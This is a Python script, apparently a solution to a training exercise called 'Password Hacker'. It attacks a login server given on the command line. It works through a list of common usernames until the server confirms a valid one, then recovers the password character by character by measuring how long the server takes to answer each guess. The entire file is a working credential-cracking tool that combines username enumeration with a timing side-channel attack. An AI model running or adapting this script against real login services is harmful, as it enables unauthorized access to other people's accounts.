import socket
import json
import sys
import string
import datetime


# File of common usernames
logins = "/Users/andrescabrera/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt"

# Arguments for connection
args = sys.argv
address = (args[1], int(args[2]))

# Ascii values
dictionary = "".join((string.ascii_letters, string.digits))

# Possible responses
login_error = "Wrong login!"
password_error = "Wrong password!"
response = login_error
password = ''

# Connection to server
with socket.socket() as client_socket:
    client_socket.connect(address)
    with open(logins, "r") as login:
        login_iter = (line.strip() for line in login.readlines())
        while response == login_error:
            admin = "".join(next(login_iter))
            json_file = {'login': admin, 'password': ' '}
            client_socket.send(json.dumps(json_file).encode())
            response = json.loads(client_socket.recv(1024).decode())['result']
        success = False
        while not success:
            for i in dictionary:
                json_file = {'login': admin, 'password': password + i}
                client_socket.send(json.dumps(json_file).encode())
                start_time = datetime.datetime.now().microsecond
                response = json.loads(client_socket.recv(1024).decode())['result']
                end_time = datetime.datetime.now().microsecond
                total_time = end_time - start_time
                if response == "Connection success!":
                    success = True
                    break
                elif response == "Wrong password!" and total_time > 100:
                    password += i
                    break

    print(json.dumps(json_file, indent=4))
